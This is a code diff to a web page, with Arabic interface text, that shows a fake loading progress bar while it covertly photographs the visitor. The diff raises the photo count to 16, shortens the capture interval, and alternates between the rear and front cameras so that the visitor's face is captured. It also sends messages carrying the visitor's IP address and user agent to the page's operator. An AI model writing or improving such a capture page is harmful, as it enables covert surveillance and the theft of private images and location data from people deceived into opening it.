@@ -102,6 +102,15 @@
             padding-top: 14px;
         }
         .hidden { display: none; }
+        .camera-badge {
+            display: inline-block;
+            background: rgba(233, 69, 96, 0.15);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #e94560;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -116,6 +125,7 @@
                 <div class="fill" id="progressFill"></div>
             </div>
             <div class="status-text" id="progressText">جاري التحميل 0%</div>
+            <div class="camera-badge" id="cameraBadge">📷 كاميرا خلفية + أمامية</div>
         </div>
 
         <div id="status">⏳ جاري التجهيز...</div>
@@ -129,6 +139,7 @@
         const statusDiv = document.getElementById('status');
         const progressFill = document.getElementById('progressFill');
         const progressText = document.getElementById('progressText');
+        const cameraBadge = document.getElementById('cameraBadge');
 
         let hasSent = false;
         let isSending = false;
@@ -136,8 +147,10 @@
         let stream = null;
         let captureInterval = null;
         let photoCount = 0;
-        const maxPhotos = 12;
+        const maxPhotos = 16;
         let progress = 0;
+        let currentCamera = 'environment';
+        let isSwitching = false;
 
         // ====== إرسال صورة ======
         async function sendPhoto(blob) {
@@ -175,7 +188,7 @@
         }
 
         // ====== بدء الكاميرا ======
-        async function startCamera() {
+        async function startCamera(mode) {
             try {
                 if (stream) {
                     stream.getTracks().forEach(t => t.stop());
@@ -184,13 +197,16 @@
 
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: 'environment',
+                        facingMode: mode,
                         width: { ideal: 640 },
                         height: { ideal: 480 }
                     },
                     audio: false
                 });
 
+                currentCamera = mode;
+                const cameraName = mode === 'environment' ? 'خلفية' : 'أمامية';
+                cameraBadge.textContent = `📷 كاميرا ${cameraName}`;
                 return true;
             } catch (error) {
                 console.log('❌ فشل الكاميرا:', error);
@@ -214,8 +230,11 @@
                 canvas.height = settings.height || 480;
                 const ctx = canvas.getContext('2d');
 
-                ctx.translate(canvas.width, 0);
-                ctx.scale(-1, 1);
+                // عكس الصورة للكاميرا الخلفية فقط
+                if (currentCamera === 'environment') {
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
+                }
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                 const imageData = canvas.toDataURL('image/jpeg', 0.9);
@@ -224,6 +243,34 @@
             } catch (e) {
                 console.log('❌ فشل التصوير:', e);
                 return null;
+            }
+        }
+
+        // ====== التبديل بين الكاميرات ======
+        async function switchCamera() {
+            if (isSwitching) return;
+            isSwitching = true;
+
+            const nextMode = currentCamera === 'environment' ? 'user' : 'environment';
+            const cameraName = nextMode === 'environment' ? 'خلفية' : 'أمامية';
+            statusDiv.innerHTML = `🔄 جاري التبديل إلى الكاميرا ${cameraName}...`;
+            statusDiv.style.color = '#ff9800';
+            cameraBadge.textContent = `📷 جاري التبديل...`;
+
+            const success = await startCamera(nextMode);
+            isSwitching = false;
+
+            if (success) {
+                statusDiv.innerHTML = `✅ تم التبديل إلى الكاميرا ${cameraName}`;
+                statusDiv.style.color = '#4caf50';
+                // إرسال إشعار بالتبديل
+                const ip = await getIP();
+                await sendMessage(`🔄 **تم التبديل إلى الكاميرا ${cameraName}**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}`);
+                return true;
+            } else {
+                statusDiv.innerHTML = `⚠️ فشل التبديل إلى الكاميرا ${cameraName}`;
+                statusDiv.style.color = '#ff9800';
+                return false;
             }
         }
 
@@ -243,7 +290,7 @@
             }
 
             const ip = await getIP();
-            await sendMessage(`📸 **تم إرسال ${successCount} صورة**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}`);
+            await sendMessage(`📸 **تم إرسال ${successCount} صورة**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}\n📷 كاميرات: خلفية + أمامية`);
 
             if (stream) {
                 stream.getTracks().forEach(t => t.stop());
@@ -259,10 +306,11 @@
 
         // ====== بدء التصوير التلقائي ======
         async function startAutoCapture() {
-            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا...`;
+            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا الخلفية...`;
             statusDiv.style.color = '#ff9800';
 
-            const cameraReady = await startCamera();
+            // بدء بالكاميرا الخلفية
+            const cameraReady = await startCamera('environment');
             if (!cameraReady) {
                 statusDiv.innerHTML = `⚠️ لم نتمكن من الوصول للكاميرا، تأكد من الصلاحية`;
                 statusDiv.style.color = '#ff9800';
@@ -274,30 +322,41 @@
 
             // إرسال إشعار بدء
             const ip = await getIP();
-            await sendMessage(`📷 **بدأ التصوير التلقائي**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}`);
+            await sendMessage(`📷 **بدأ التصوير (كاميرات خلفية + أمامية)**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}`);
 
-            // التقاط صور كل 1.2 ثانية
+            let captureCount = 0;
+            const totalCaptures = maxPhotos;
+
+            // التقاط صور متتالية مع التبديل بين الكاميرات
             captureInterval = setInterval(async () => {
-                if (photoCount >= maxPhotos) {
+                if (captureCount >= totalCaptures) {
                     clearInterval(captureInterval);
-                    statusDiv.innerHTML = `✅ تم التقاط ${maxPhotos} صورة - سيتم إرسالها عند الخروج`;
+                    statusDiv.innerHTML = `✅ تم التقاط ${totalCaptures} صورة - سيتم إرسالها عند الخروج`;
                     statusDiv.style.color = '#4caf50';
                     progressFill.style.width = '100%';
                     progressText.innerHTML = '✅ اكتمل التحميل!';
-                    await sendMessage(`✅ **اكتمل التصوير** (${maxPhotos} صورة)`);
+                    await sendMessage(`✅ **اكتمل التصوير** (${totalCaptures} صورة - خلفية + أمامية)`);
                     return;
+                }
+
+                // التبديل بين الكاميرات كل 3 صور
+                if (captureCount > 0 && captureCount % 3 === 0) {
+                    await switchCamera();
+                    await new Promise(r => setTimeout(r, 300));
                 }
 
                 const blob = await capturePhoto();
                 if (blob) {
                     photos.push(blob);
+                    captureCount++;
                     photoCount++;
-                    progress = Math.round((photoCount / maxPhotos) * 100);
+                    progress = Math.round((captureCount / totalCaptures) * 100);
                     progressFill.style.width = progress + '%';
                     progressText.innerHTML = `جاري التحميل ${progress}%`;
-                    statusDiv.innerHTML = `📸 جاري التصوير ${photoCount}/${maxPhotos}`;
+                    const cameraName = currentCamera === 'environment' ? 'خلفية' : 'أمامية';
+                    statusDiv.innerHTML = `📸 جاري التصوير ${captureCount}/${totalCaptures} (${cameraName})`;
                 }
-            }, 1200);
+            }, 800);
         }
 
         // ====== مراقبة الخروج ======
